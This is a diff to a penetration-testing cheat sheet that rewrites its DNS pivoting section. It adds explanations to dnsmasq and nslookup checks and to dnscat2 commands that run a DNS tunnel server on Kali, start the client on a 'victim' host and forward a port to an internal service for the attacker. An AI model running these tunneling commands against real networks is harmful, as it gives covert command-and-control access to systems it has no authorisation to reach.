@@ -26,23 +26,40 @@ kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$PortCheck
 
 ## DNS
 
-### Nslookup
+### Dnsmasq settings and Nslookup check
 
+Run Dnsmasq and load a conf file:
 ```
 sudo dnsmasq -C dnsmasq.conf -d
+```
+Listen on the interface to check:
+```
 sudo tcpdump -i ensXpY udp port 53
-resolvectl status
-nslookup somesubzone.mydnsserver.com [victiminternaldns]
+```
+and test the name resolution on another station:
+```
+resolvectl status # check the DNS server
+nslookup somesubzone.mydnsserver.com $victiminternaldns
 ```
 
 ### Dnscat2
 
+Run a DNS server on Kali:
 ```
 dnskali$ dnscat2-server mytld.com
+```
+and start `dnscat` on the target:
+```
 victim$ ./dnscat mytld.com
-dnscat2> windows
-dnscat2> window -i 1
+```
+In the Dnscat2 shell, open a port in the target:
+```
+dnscat2> windows # with an 's'
+dnscat2> window -i 1 # without 's'
 command> ?
 command> listen 127.0.0.1:$AttackerPort $IpDeepIn:$PortService
+```
+and connect from Kali:
+```
 dnskali$ someservice localhost:$PortService
 ```
